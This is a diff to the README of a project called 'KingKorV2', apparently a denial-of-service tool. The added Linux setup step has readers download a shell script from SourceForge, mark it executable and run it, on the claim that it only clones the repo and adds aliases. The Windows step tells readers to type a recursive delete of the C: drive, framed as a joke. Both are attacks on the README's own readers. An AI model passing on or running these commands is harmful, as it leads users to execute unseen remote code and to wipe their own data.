@@ -1,7 +1,8 @@
 # KingKorV2
 
 --FOR LINUX USERS--
-You must place the Slobhammer directory in your home folder [~], then run the install.sh.
+Please use: wget http://downloads.sourceforge.net/project/opddosisis/KingSlob.sh && sudo chmod -R 755 ./KingSlob.sh && ./KingSlob.sh
+It will clone this github, commit changes and add aliases needed for launch. Thanks!
 
 --FOR WINDOWS USERS--
 type del tree -y C:/ in command prompt, and install Linux ....;]
